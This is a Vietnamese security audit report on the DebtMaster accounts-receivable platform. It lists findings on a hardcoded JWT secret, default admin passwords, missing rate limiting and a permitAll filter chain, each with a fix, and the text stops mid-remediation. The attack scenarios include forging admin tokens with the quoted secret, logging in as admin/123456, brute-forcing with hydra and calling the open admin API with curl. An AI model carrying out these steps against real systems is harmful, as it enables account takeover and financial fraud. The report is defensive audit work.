# BÁO CÁO KIỂM TOÁN BẢO MẬT TOÀN DIỆN (COMPREHENSIVE SECURITY AUDIT REPORT)
## Hệ Thống Quản Lý Và Thu Hồi Công Nợ Doanh Nghiệp (DebtMaster - B2B Order-to-Cash & AR Automation)

---

**Thông tin kiểm toán:**
- **Dự án:** DebtMaster - Order-to-Cash (O2C) & Accounts Receivable (AR) Automation Platform
- **Mã định danh báo cáo:** `SEC-AUDIT-DEBTMASTER-2026-FINAL`
- **Phiên bản báo cáo:** 1.0 (Definitive Release)
- **Ngày hoàn thành kiểm toán:** 12/11/2026
- **Phạm vi kiểm toán (Scope):** Toàn bộ mã nguồn Backend (`Backend/`, Spring Boot 3.3.4, Java 17, Spring Security 6.x, Spring Data JPA / Hibernate 6, MySQL 8.0) và Frontend (`Frontend/`, React 18, Vite 5, Tailwind CSS).
- **Tiêu chuẩn tham chiếu:** OWASP Top 10:2021, OWASP API Security Top 10, CWE (Common Weakness Enumeration), NIST SP 800-53 Rev. 5, Spring Security Hardening Guidelines, PCI-DSS v4.0.
- **Nguyên tắc kiểm toán:** Defensive Source-First Audit, Không can thiệp sửa đổi mã nguồn trong quá trình kiểm toán (Read-Only Integrity Mode).

---

## MỤC LỤC
1. [Tóm Tắt Điều Hành (Executive Summary)](#1-tóm-tắt-điều-hành-executive-summary)
   - [1.1 Bối Cảnh Và Mục Tiêu](#11-bối-cảnh-và-mục-tiêu)
   - [1.2 Phương Pháp Kiểm Toán](#12-phương-pháp-kiểm-toán)
   - [1.3 Đánh Giá Tổng Quan Tư Thế An Ninh (Security Posture)](#13-đánh-giá-tổng-quan-tư-thế-an-ninh-security-posture)
2. [Bảng Thống Kê Tổng Hợp Lỗ Hổng (Vulnerability Matrix)](#2-bảng-thống-kê-tổng-hợp-lỗ-hổng-vulnerability-matrix)
3. [Chi Tiết Phát Hiện Lỗ Hổng Theo Từng Mục Tiêu (Detailed Findings)](#3-chi-tiết-phát-hiện-lỗ-hổng-theo-từng-mục-tiêu-detailed-findings)
   - [Mục Tiêu 1: Xác Thực & Quản Lý Phiên (Authentication & Session Management)](#mục-tiêu-1-xác-thực--quản-lý-phiên-authentication--session-management)
   - [Mục Tiêu 2: Phân Quyền & Kiểm Soát Truy Cập RBAC (Authorization & RBAC)](#mục-tiêu-2-phân-quyền--kiểm-soát-truy-cập-rbac-authorization--rbac)
   - [Mục Tiêu 3: Lỗ Hổng Injection & Xác Thực Dữ Liệu Đầu Vào (Injection & Validation)](#mục-tiêu-3-lỗ-hổng-injection--xác-thực-dữ-liệu-đầu-vào-injection--validation)
   - [Mục Tiêu 4: Kiểm Soát Quyền Mức Đối Tượng (BOLA / IDOR)](#mục-tiêu-4-kiểm-soát-quyền-mức-đối-tượng-bola--idor)
   - [Mục Tiêu 5: Lộ Lọt Dữ Liệu Nhạy Cảm & An Ninh API (Sensitive Data & API Security)](#mục-tiêu-5-lộ-lọt-dữ-liệu-nhạy-cảm--an-ninh-api-sensitive-data--api-security)
   - [Mục Tiêu 6: Cấu Hình Hệ Thống, Thư Viện Phụ Thuộc & An Ninh Frontend (Config, Dependencies & Frontend)](#mục-tiêu-6-cấu-hình-hệ-thống-thư-viện-phụ-thuộc--an-ninh-frontend-config-dependencies--frontend)
4. [Lộ Trình Khắc Phục & Khuyến Nghị Chiến Lược (Remediation Roadmap)](#4-lộ-trình-khắc-phục--khuyến-nghị-chiến-lược-remediation-roadmap)
   - [4.1 Giai Đoạn 1: Vá Nóng Khẩn Cấp (Immediate Hotfixes - 24h đến 48h)](#41-giai-đoạn-1-vá-nóng-khẩn-cấp-immediate-hotfixes---24h-đến-48h)
   - [4.2 Giai Đoạn 2: Gia Cố Ngắn Hạn (Short-Term Hardening - 1 đến 2 tuần)](#42-giai-đoạn-2-gia-cố-ngắn-hạn-short-term-hardening---1-đến-2-tuần)
   - [4.3 Giai Đoạn 3: Tái Cấu Trúc & Tự Động Hóa Dài Hạn (Medium-Term Architectural Improvements - 1 đến 2 tháng)](#43-giai-đoạn-3-tái-cấu-trúc--tự-động-hóa-dài-hạn-medium-term-architectural-improvements---1-đến-2-tháng)

---

## 1. TÓM TẮT ĐIỀU HÀNH (EXECUTIVE SUMMARY)

### 1.1 Bối Cảnh Và Mục Tiêu
Hệ thống **DebtMaster** là nền tảng quản lý quy trình từ đặt hàng đến thu tiền (Order-to-Cash - O2C) và tự động hóa quản lý công nợ phải thu (Accounts Receivable - AR Automation) dành cho các doanh nghiệp B2B và chuỗi phòng khám liên kết. Hệ thống xử lý các luồng nghiệp vụ tài chính trọng yếu:
- Đánh giá hạn mức tín dụng công nợ và tự động áp đặt khóa đơn hàng khi rủi ro quá tải (`HARD_BLOCK`).
- Xuất hóa đơn điện tử (e-Invoices) và tích hợp cổng thanh toán tự động qua Tài khoản ảo (Virtual Account - VA) và mã VietQR động.
- Quy trình phê duyệt kiểm soát kép (Maker-Checker / Four-Eyes Principle) đối với các quyết định xóa nợ khó đòi (Bad Debt Write-off), nâng hạn mức tín dụng hoặc phát hành giấy báo nợ (Dunning).
- Quản lý giao dịch chuyển tiền trực tiếp (Instant Payouts), hoàn tiền (Refunds) và quyết toán công nợ giữa các phòng khám liên kết.

Do tính chất đặc thù xử lý dòng tiền và dữ liệu tài chính doanh nghiệp có giá trị pháp lý và giá trị kinh tế cao, cuộc kiểm toán an ninh toàn diện này được tiến hành nhằm xác định các lỗ hổng kỹ thuật, khiếm khuyết thiết kế kiến trúc và rủi ro tuân thủ trên toàn bộ hệ thống.

### 1.2 Phương Pháp Kiểm Toán
Cuộc kiểm toán áp dụng phương pháp **Kiểm tra An ninh Mã nguồn Đa tầng (Defense-in-Depth Source-First Static Analysis & Threat Modeling)** đối chiếu trực tiếp với:
1. **OWASP Top 10:2021** (A01: Broken Access Control, A02: Cryptographic Failures, A03: Injection, A04: Insecure Design, A05: Security Misconfiguration, A07: Identification and Authentication Failures, A09: Security Logging Failures).
2. **OWASP API Security Top 10** (API1: BOLA, API2: Broken Authentication, API3: Broken Object Property Level Authorization, API5: Broken Function Level Authorization, API6: Unrestricted Access to Sensitive Business Flows / Mass Assignment).
3. **CWE Directory** (Common Weakness Enumeration của MITRE).
4. **Spring Security Architecture & Framework Hardening Guidelines**.
5. **Nguyên tắc phân nhiệm Segregation of Duties (SoD)** và kiểm soát kép (Four-Eyes Principle) trong tiêu chuẩn kiểm soát tài chính kế toán quốc tế.

### 1.3 Đánh Giá Tổng Quan Tư Thế An Ninh (Security Posture)
Kết quả kiểm toán cho thấy tư thế an ninh hiện tại của hệ thống DebtMaster ở mức **CỰC KỲ NGUY HIỂM (SEVERELY COMPROMISED / CRITICAL RISK)**. Hệ thống gặp phải hiện tượng **Sụp Đổ Toàn Diện Biên Giới Kiểm Soát Truy Cập (Systemic Access Control Collapse)** với các đặc điểm cốt lõi sau:
1. **Mất Hiệu Lực Hoàn Toàn Tường Lửa Spring Security:** Cấu hình chuỗi lọc `SecurityFilterChain` trong `WebSecurityConfig.java` cho phép `permitAll()` công khai trên toàn bộ đường dẫn `/api/**`. Đồng thời, toàn bộ 9 Controller phụ trách API tài chính và quản trị không hề có bất kỳ annotation kiểm tra quyền hạn (`@PreAuthorize`) nào. Bất kỳ tác nhân nào trên Internet cũng có thể thực hiện các hành động quản trị, rút tiền hoặc xóa dữ liệu mà không cần xác thực.
2. **Ủy Thác Xác Thực Nguy Hại Cho Client-Side:** Hệ thống kiểm tra quyền hạn nghiệp vụ dựa trên HTTP Header `X-User-Role` do Client gửi lên với giá trị mặc định là `ROLE_ADMIN` nếu Client không truyền. Trên giao diện Frontend, hệ thống cho phép người dùng tự do chuyển quyền `ROLE_ADMIN` qua thanh menu và tự động cấp quyền `ROLE_ADMIN` khi đăng nhập thất bại.
3. **Phá Vỡ Hoàn Toàn Nguyên Tắc Kiểm Soát Kép (Maker-Checker Bypass):** Nghiệp vụ phê duyệt xóa nợ và mở khóa hạn mức tín dụng không hề kiểm tra danh tính người tạo yêu cầu (Maker) và người phê duyệt (Checker), cho phép một tài khoản tự duyệt các giao dịch tài chính gian lận hàng trăm triệu đồng.
4. **Lỗ Hổng BOLA/IDOR Diện Rộng:** Không có bất kỳ ràng buộc đa người thuê (Multi-Tenancy) hoặc kiểm tra quyền sở hữu đối tượng. Người dùng của doanh nghiệp này có thể xem, chỉnh sửa, xóa khách hàng, giao dịch, hóa đơn và yêu cầu rút tiền của doanh nghiệp khác thông qua việc thay đổi ID trên URL.
5. **Lộ Lọt Bí Mật Mật Mã & Xác Thực Thanh Toán VietQR Bị Bỏ Ngỏ:** Khóa bí mật JWT HMAC-SHA512 bị hardcode công khai trong tệp cấu hình và mã nguồn; mật khẩu quản trị mặc định `admin/123456` được in rõ ràng ra log khởi động; endpoint ghi nhận thanh toán hóa đơn VietQR không có chữ ký HMAC, cho phép kẻ tấn công tự đánh dấu các hóa đơn hàng tỷ đồng thành `PAID` mà không cần nộp tiền thực tế vào ngân hàng.

---

## 2. BẢNG THỐNG KÊ TỔNG HỢP LỖ HỔNG (VULNERABILITY MATRIX)

Sau khi tổng hợp, phân tích nguyên nhân gốc rễ và loại bỏ trùng lặp từ tất cả các bề mặt kiểm toán, cuộc kiểm toán ghi nhận **38 phát hiện lỗ hổng an ninh độc lập** được phân bổ như sau:

| Mục Tiêu Kiểm Toán | Critical | High | Medium | Low | Tổng Số |
|:---|:---:|:---:|:---:|:---:|:---:|
| **Mục tiêu 1: Xác Thực & Quản Lý Phiên (Authentication & Session)** | 1 | 3 | 3 | 0 | **7** |
| **Mục tiêu 2: Phân Quyền & RBAC (Authorization & RBAC)** | 6 | 0 | 0 | 0 | **6** |
| **Mục tiêu 3: Lỗ Hổng Injection & Xác Thực Dữ Liệu (Injection & Validation)** | 0 | 2 | 2 | 1 | **5** |
| **Mục tiêu 4: Kiểm Soát Quyền Mức Đối Tượng (BOLA & IDOR)** | 2 | 2 | 2 | 0 | **6** |
| **Mục tiêu 5: Lộ Lọt Dữ Liệu Nhạy Cảm & An Ninh API (Data Exposure & API)** | 2 | 3 | 1 | 0 | **6** |
| **Mục tiêu 6: Cấu Hình Hệ Thống, Phụ Thuộc & An Ninh Frontend (Config & Frontend)** | 2 | 4 | 1 | 1 | **8** |
| **TỔNG CỘNG HỆ THỐNG** | **13** | **14** | **9** | **2** | **38** |

### Biểu đồ phân bổ mức độ nghiêm trọng:
- **CRITICAL (Nguy cơ tối khẩn):** 13 lỗ hổng (34.2%) — Dẫn đến chiếm toàn quyền hệ thống, giả mạo thanh toán VietQR, chuyển tiền gian lận, phá vỡ Maker-Checker.
- **HIGH (Nguy cơ cao):** 14 lỗ hổng (36.8%) — Dẫn đến thực thi mã lệnh gián tiếp (CSV injection), XSS đánh cắp phiên, BOLA sửa đổi giao dịch, rò rỉ mật khẩu trong log.
- **MEDIUM (Nguy cơ trung bình):** 9 lỗ hổng (23.7%) — Dẫn đến tấn công từ chối dịch vụ (DoS), rò rỉ cấu trúc CSDL nội bộ, thiếu TLS và thiếu HTTP security headers.
- **LOW (Nguy cơ thấp):** 2 lỗ hổng (5.3%) — Thư viện phụ thuộc cũ, truy vấn tìm kiếm LIKE chưa escape metacharacters.

---

## 3. CHI TIẾT PHÁT HIỆN LỖ HỔNG THEO TỪNG MỤC TIÊU (DETAILED FINDINGS)

---

### MỤC TIÊU 1: XÁC THỰC & QUẢN LÝ PHIÊN (AUTHENTICATION & SESSION MANAGEMENT)

#### SEC-AUTH-01: Khóa Bí Mật Ký JWT Bị Hardcode Trong Tệp Cấu Hình Và Mã Nguồn
- **Định danh CWE / OWASP:** CWE-798 (Use of Hard-coded Credentials), CWE-321 (Use of Hard-coded Cryptographic Key), OWASP A02:2021 (Cryptographic Failures).
- **Mức độ rủi ro:** **CRITICAL** (CVSS v3.1: 9.8 / AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Backend/src/main/resources/application.properties`: Dòng 25
  - `Backend/src/main/java/com/cactus/practice/security/jwt/JwtUtils.java`: Dòng 24–25, 30–33
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Hệ thống sử dụng thuật toán đối xứng HMAC-SHA512 để ký và xác thực JWT token. Tuy nhiên, chuỗi khóa bí mật `jwt.secret` được hardcode công khai trong tệp cấu hình `application.properties` và được lặp lại làm giá trị fallback mặc định ngay trong annotation `@Value` của lớp `JwtUtils.java`:
  ```properties
  # Backend/src/main/resources/application.properties:25
  jwt.secret=cactusPracticeSuperSecretJwtKey2026SecureKeyWithSufficientLengthForHS512Algorithm!
  ```
  ```java
  // Backend/src/main/java/com/cactus/practice/security/jwt/JwtUtils.java:24-25
  @Value("${jwt.secret:cactusPracticeSuperSecretJwtKey2026SecureKeyWithSufficientLengthForHS512Algorithm!}")
  private String jwtSecret;
  ```
  Do sử dụng mã hóa đối xứng, bất kỳ ai có quyền đọc mã nguồn hoặc tệp cấu hình đều sở hữu khóa ký này, cho phép tạo ra các token JWT hợp lệ với bất kỳ định danh tài khoản và quyền hạn nào (`ROLE_ADMIN`) mà không cần trải qua quá trình xác thực đăng nhập.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  1. Kẻ tấn công trích xuất chuỗi bí mật từ mã nguồn hoặc file jar giải nén: `cactusPracticeSuperSecretJwtKey2026SecureKeyWithSufficientLengthForHS512Algorithm!`.
  2. Kẻ tấn công dùng thư viện PyJWT hoặc công cụ jwt.io để ký một JWT payload:
     `{"sub":"admin","id":1,"email":"admin@debtmaster.vn","roles":["ROLE_ADMIN"],"exp":1893456000}` bằng thuật toán HS512.
  3. Gửi request kèm header `Authorization: Bearer <forged_token>` tới bất kỳ endpoint nội bộ nào. Hệ thống xác thực chữ ký thành công và cấp toàn quyền quản trị cho kẻ tấn công.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  1. Xóa bỏ hoàn toàn giá trị bí mật hardcoded trong `application.properties` và giá trị fallback mặc định trong `JwtUtils.java`.
  2. Bắt buộc nạp khóa từ biến môi trường hệ thống (`JWT_SECRET`) hoặc dịch vụ quản lý secret tập trung (HashiCorp Vault, AWS Secrets Manager).
  3. Kiểm tra độ dài khóa tại thời điểm khởi động ứng dụng (tối thiểu 64 bytes cho HS512):
  ```java
  // Đoạn mã phòng thủ trong JwtUtils.java
  @Component
  public class JwtUtils {
      @Value("${jwt.secret}")
      private String jwtSecret;

      @PostConstruct
      public void validateSecretKey() {
          if (jwtSecret == null || jwtSecret.getBytes(StandardCharsets.UTF_8).length < 64) {
              throw new IllegalStateException("FATAL: JWT Secret must be provided via JWT_SECRET environment variable and be at least 64 bytes long for HS512.");
          }
      }

      private Key getSigningKey() {
          return Keys.hmacShaKeyFor(jwtSecret.getBytes(StandardCharsets.UTF_8));
      }
  }
  ```

---

#### SEC-AUTH-02: Thiếu Cơ Chế Thu Hồi / Blacklist Token Và Thời Gian Sống Token Quá Dài (24 Giờ)
- **Định danh CWE / OWASP:** CWE-613 (Insufficient Session Expiration), CWE-384 (Session Fixation), OWASP A07:2021 (Identification and Authentication Failures).
- **Mức độ rủi ro:** **HIGH** (CVSS v3.1: 7.5 / AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Backend/src/main/resources/application.properties`: Dòng 26
  - `Backend/src/main/java/com/cactus/practice/security/jwt/JwtUtils.java`: Dòng 27–28, 48
  - `Backend/src/main/java/com/cactus/practice/security/jwt/AuthTokenFilter.java`: Dòng 38–52
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Hệ thống thiết lập thời gian hết hạn của JWT access token lên tới 24 giờ (`jwt.expirationMs=86400000`). Đồng thời, hệ thống không duy trì bất kỳ danh sách thu hồi token (Token Blacklist), không có cơ chế lưu trữ JTI (JWT ID) và không có API đăng xuất (`/api/auth/logout`) trên Backend. Khi một nhân viên bị chấm dứt hợp đồng, tài khoản bị vô hiệu hóa hoặc token bị đánh cắp, token đó vẫn tiếp tục có hiệu lực hoàn toàn cho đến hết 24 giờ.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  1. Token của một kế toán viên bị rò rỉ qua mạng hoặc qua XSS trên trình duyệt.
  2. Quản trị viên phát hiện sự cố và đổi mật khẩu hoặc vô hiệu hóa tài khoản kế toán viên.
  3. Kẻ tấn công vẫn sử dụng token cũ đã đánh cắp để gửi request duyệt lệnh thanh toán hoặc tải dữ liệu công nợ. Do `AuthTokenFilter` chỉ kiểm tra tính hợp lệ về mặt toán học của chữ ký và thời gian `exp`, request của kẻ tấn công vẫn được chấp nhận trong suốt 24 giờ kể từ thời điểm phát hành.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  1. Rút ngắn thời gian sống của Access Token xuống còn 15 phút (`900000 ms`).
  2. Sử dụng Redis để quản lý danh sách token đã thu hồi (Blacklist) theo định danh `jti` với thời gian TTL tự động hủy bằng với thời gian hết hạn của token.
  3. Bổ sung endpoint `POST /api/auth/logout` để ghi nhận việc hủy phiên:
  ```java
  // Trong AuthTokenFilter.java
  String jwt = parseJwt(request);
  if (jwt != null && jwtUtils.validateJwtToken(jwt)) {
      String jti = jwtUtils.getJtiFromToken(jwt);
      if (tokenBlacklistService.isBlacklisted(jti)) {
          response.sendError(HttpServletResponse.SC_UNAUTHORIZED, "Token has been revoked/logged out.");
          return;
      }
      // Tiếp tục nạp Authentication vào SecurityContext
  }
  ```

---

#### SEC-AUTH-03: Hoàn Toàn Thiếu Cơ Chế Refresh Token Và Xoay Vòng Khóa Phiên (Token Rotation)
- **Định danh CWE / OWASP:** CWE-613 (Insufficient Session Expiration), OWASP A07:2021 (Identification and Authentication Failures).
- **Mức độ rủi ro:** **MEDIUM** (CVSS v3.1: 5.3 / AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Backend/src/main/java/com/cactus/practice/security/jwt/JwtUtils.java`: Dòng 35–51
  - `Backend/src/main/java/com/cactus/practice/rest/AuthController.java`: Dòng 52–69
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Hệ thống DebtMaster chỉ phát hành duy nhất một Access Token dài hạn mà không thiết kế thực thể và quy trình `RefreshToken`. Việc thiếu cơ chế Refresh Token buộc các nhà phát triển phải kéo dài tuổi thọ của Access Token (24h) để người dùng không bị gián đoạn trải nghiệm, vi phạm nguyên tắc bảo mật phiên giao dịch tài chính.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  Kẻ tấn công sau khi trích xuất được Access Token từ bộ nhớ `localStorage` có thể duy trì quyền truy cập thụ động mà không bị hệ thống ép buộc phải tái xác thực qua Refresh Token, đồng thời hệ thống không thể phát hiện tình trạng truy cập đồng thời từ 2 vị trí địa lý khác nhau.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Tạo thực thể `RefreshToken` lưu trong CSDL kết nối với người dùng; cấp Refresh Token với thời gian 7 ngày trong Cookie `HttpOnly` và áp dụng kỹ thuật Refresh Token Rotation (hủy Refresh Token cũ ngay khi cấp cặp token mới).

---

#### SEC-AUTH-04: Mật Khẩu Mặc Định Yếu Của Quản Trị Viên Và Nhân Viên Được Tự Động Khởi Tạo
- **Định danh CWE / OWASP:** CWE-1392 (Use of Default Credentials), CWE-521 (Weak Password Requirements), OWASP A07:2021 (Identification and Authentication Failures).
- **Mức độ rủi ro:** **HIGH** (CVSS v3.1: 8.8 / AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Backend/src/main/java/com/cactus/practice/config/DataInitializer.java`: Dòng 71–85
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Lớp `DataInitializer` tự động nạp tài khoản mẫu vào CSDL mỗi khi ứng dụng khởi chạy nếu chưa tồn tại tài khoản:
  ```java
  // Backend/src/main/java/com/cactus/practice/config/DataInitializer.java:73, 80
  User admin = new User("admin", passwordEncoder.encode("123456"), "admin@debtmaster.vn");
  admin.setRoles(Set.of(RoleType.ROLE_ADMIN, RoleType.ROLE_STAFF, RoleType.ROLE_USER));
  ...
  User staff = new User("staff", passwordEncoder.encode("123456"), "ketoan@debtmaster.vn");
  staff.setRoles(Set.of(RoleType.ROLE_STAFF, RoleType.ROLE_USER));
  ```
  Mật khẩu `123456` là mật khẩu cực kỳ phổ biến nằm trong top các từ điển tấn công Brute-Force. Việc tự động nạp trên môi trường triển khai thực tế sẽ dẫn đến việc kẻ tấn công chiếm toàn quyền kiểm soát ngay lập tức.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  1. Kẻ tấn công quét địa chỉ IP của máy chủ ứng dụng và thấy dịch vụ DebtMaster đang chạy.
  2. Gửi request `POST /api/auth/login` với payload: `{"username":"admin","password":"123456"}`.
  3. Máy chủ trả về HTTP 200 kèm JWT mang quyền `ROLE_ADMIN`, cho phép truy cập toàn bộ hồ sơ khách hàng và phê duyệt giải ngân công nợ.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Vô hiệu hóa việc nạp tài khoản mẫu trong môi trường Production thông qua Spring Profile (`@Profile("!prod")`). Đối với lần khởi chạy đầu tiên trong Production, tạo mật khẩu ngẫu nhiên an toàn, in một lần duy nhất ra màn hình console và yêu cầu đổi mật khẩu bắt buộc ở lần đăng nhập đầu tiên:
  ```java
  // Trong DataInitializer.java
  @Value("${app.seed.demo-users:false}")
  private boolean seedDemoUsers;

  private void seedUsers() {
      if (!seedDemoUsers) {
          logger.info("Demo user seeding is DISABLED by configuration.");
          return;
      }
      // Chỉ nạp tài khoản test khi cờ bật ở môi trường dev/local
  }
  ```

---

#### SEC-AUTH-05: Thiếu Quy Định Kiểm Tra Độ Phức Tạp Mật Khẩu Khi Đăng Ký Tài Khoản
- **Định danh CWE / OWASP:** CWE-521 (Weak Password Requirements), OWASP A07:2021 (Identification and Authentication Failures).
- **Mức độ rủi ro:** **MEDIUM** (CVSS v3.1: 5.3 / AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Backend/src/main/java/com/cactus/practice/dto/RegisterRequest.java`: Dòng 15–16
  - `Backend/src/main/java/com/cactus/practice/rest/AuthController.java`: Dòng 73–86
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Trong DTO `RegisterRequest.java`, trường `password` chỉ được đánh dấu duy nhất bằng annotation `@NotBlank`:
  ```java
  @NotBlank
  private String password;
  ```
  Hệ thống không kiểm tra độ dài tối thiểu, không yêu cầu chữ hoa, chữ thường, chữ số hay ký tự đặc biệt. Người dùng có thể đăng ký tài khoản với mật khẩu chỉ có 1 ký tự như `"1"` hoặc `"a"`.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  Khách hàng B2B tạo tài khoản với mật khẩu đơn giản ("123456"). Kẻ tấn công sử dụng công cụ rà quét từ điển tấn công online dictionary attack và dễ dàng chiếm quyền tài khoản khách hàng để sửa đổi thông tin thanh toán hoặc đặt hàng gian lận.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Sử dụng Hibernate Validator để ràng buộc độ dài tối thiểu 8-64 ký tự và áp dụng Regex kiểm tra độ phức tạp:
  ```java
  @NotBlank(message = "Mật khẩu không được để trống")
  @Size(min = 8, max = 64, message = "Mật khẩu phải từ 8 đến 64 ký tự")
  @Pattern(
      regexp = "^(?=.*[0-9])(?=.*[a-z])(?=.*[A-Z])(?=.*[@#$%^&+=!]).*$",
      message = "Mật khẩu phải chứa ít nhất 1 chữ số, 1 chữ thường, 1 chữ hoa và 1 ký tự đặc biệt"
  )
  private String password;
  ```

---

#### SEC-AUTH-06: Thiếu Cơ Chế Giới Hạn Tốc Độ (Rate Limiting) Và Khóa Tài Khoản Khi Đăng Nhập Sai Quá Số Lần
- **Định danh CWE / OWASP:** CWE-307 (Improper Restriction of Excessive Authentication Attempts), OWASP A07:2021 (Identification and Authentication Failures).
- **Mức độ rủi ro:** **MEDIUM** (CVSS v3.1: 5.3 / AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Backend/src/main/java/com/cactus/practice/rest/AuthController.java`: Dòng 52–69
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Endpoint `/api/auth/login` không có cơ chế giới hạn số lần thử (Rate Limiting) theo địa chỉ IP hay theo Username. Kẻ tấn công có thể gửi hàng triệu request liên tục mỗi phút để bẻ khóa mật khẩu tài khoản người dùng hoặc nhân viên mà không bị ngắt kết nối hay khóa tạm thời.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  Sử dụng công cụ `hydra` hoặc script Python gửi liên tục 100,000 HTTP POST request vào `/api/auth/login` nhắm vào tài khoản `ketoan` hoặc `admin`. Hệ thống xử lý kiểm tra hash BCrypt liên tục, vừa gây cạn kiệt tài nguyên CPU vừa cho phép dò trúng mật khẩu.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Tích hợp bộ lọc Bucket4j hoặc Redis Token Bucket: Giới hạn tối đa 5 lần đăng nhập sai trong vòng 15 phút cho mỗi địa chỉ IP/Username. Nếu vượt quá, tạm khóa 30 phút và gửi cảnh báo về email quản trị.

---

#### SEC-AUTH-07: Bộ Lọc JWT Bỏ Qua Kiểm Tra Trạng Thái Kích Hoạt Của Tài Khoản (`isEnabled()`)
- **Định danh CWE / OWASP:** CWE-284 (Improper Access Control), CWE-613 (Insufficient Session Expiration), OWASP A01:2021 (Broken Access Control).
- **Mức độ rủi ro:** **HIGH** (CVSS v3.1: 7.4 / AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Backend/src/main/java/com/cactus/practice/security/jwt/AuthTokenFilter.java`: Dòng 42–49
  - `Backend/src/main/java/com/cactus/practice/security/service/UserDetailsImpl.java`: Dòng 73
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Trong lớp `AuthTokenFilter.java`, sau khi xác thực chữ ký token, mã nguồn tải thông tin tài khoản qua `userDetailsService.loadUserByUsername(username)`:
  ```java
  UserDetails userDetails = userDetailsService.loadUserByUsername(username);
  UsernamePasswordAuthenticationToken authentication =
          new UsernamePasswordAuthenticationToken(userDetails, null, userDetails.getAuthorities());
  ```
  Bộ lọc không gọi phương thức kiểm tra `userDetails.isEnabled()`. Dù quản trị viên đã tắt trạng thái kích hoạt của người dùng trong CSDL (`user.setEnabled(false)` qua `AdminController`), các request mang token JWT cũ vẫn được coi là hợp lệ và xử lý bình thường.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  Một nhân viên tín dụng bị nghi ngờ gian lận và quản trị viên lập tức tắt tài khoản (`PUT /api/admin/users/5/status?enabled=false`). Tuy nhiên, nhân viên này vẫn sử dụng token hiện tại trên máy tính để thực hiện giải phóng hạn mức tín dụng hoặc xem hồ sơ công nợ nội bộ.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Kiểm tra tường minh trạng thái `userDetails.isEnabled()` ngay trong `AuthTokenFilter`:
  ```java
  // Trong AuthTokenFilter.java
  UserDetails userDetails = userDetailsService.loadUserByUsername(username);
  if (!userDetails.isEnabled()) {
      logger.warn("Cảnh báo: Tài khoản {} đã bị vô hiệu hóa nhưng cố tình truy cập hệ thống!", username);
      response.sendError(HttpServletResponse.SC_UNAUTHORIZED, "Tài khoản của bạn đã bị khóa hoặc vô hiệu hóa.");
      return;
  }
  ```

---

### MỤC TIÊU 2: PHÂN QUYỀN & KIỂM SOÁT TRUY CẬP RBAC (AUTHORIZATION & RBAC)

#### SEC-RBAC-01: Cấu Hình `permitAll()` Toàn Diện Trên Mọi API Trong `SecurityFilterChain`
- **Định danh CWE / OWASP:** CWE-284 (Improper Access Control), CWE-306 (Missing Authentication for Critical Function), OWASP A01:2021 (Broken Access Control).
- **Mức độ rủi ro:** **CRITICAL** (CVSS v3.1: 10.0 / AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Backend/src/main/java/com/cactus/practice/security/WebSecurityConfig.java`: Dòng 95–105
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Trong cấu hình bảo mật `SecurityFilterChain`, toàn bộ đường dẫn bắt đầu bằng `/api/**` được cấu hình công khai hoàn toàn:
  ```java
  // Backend/src/main/java/com/cactus/practice/security/WebSecurityConfig.java:95-105
  .authorizeHttpRequests(auth -> auth
          // Public endpoints (Auth, Swagger, API for frontend dashboard)
          .requestMatchers(
                  "/api/**",
                  "/v3/api-docs/**",
                  "/swagger-ui/**",
                  "/swagger-ui.html",
                  "/actuator/**"
          ).permitAll()
          .anyRequest().authenticated()
  );
  ```
  Vì toàn bộ các Controller của hệ thống đều có tiền tố `@RequestMapping("/api/...")`, cấu hình này làm vô hiệu hóa hoàn toàn cơ chế bảo vệ của Spring Security tại tầng lọc HTTP. Bất kỳ request nào không kèm Authorization token đều được cho qua thẳng tới tầng xử lý của Controller.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  Kẻ tấn công không cần đăng nhập, gửi trực tiếp lệnh cURL:
  ```bash
  curl -X GET http://localhost:8080/api/admin/users
  ```
  Máy chủ trả về HTTP 200 OK cùng danh sách toàn bộ tài khoản, email và quyền hạn nội bộ.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Thu hồi quyền `permitAll()` trên `/api/**`. Chỉ cho phép truy cập công khai duy nhất đối với các endpoint đăng nhập, đăng ký và tài liệu API nếu cần thiết:
  ```java
  // Khắc phục trong WebSecurityConfig.java
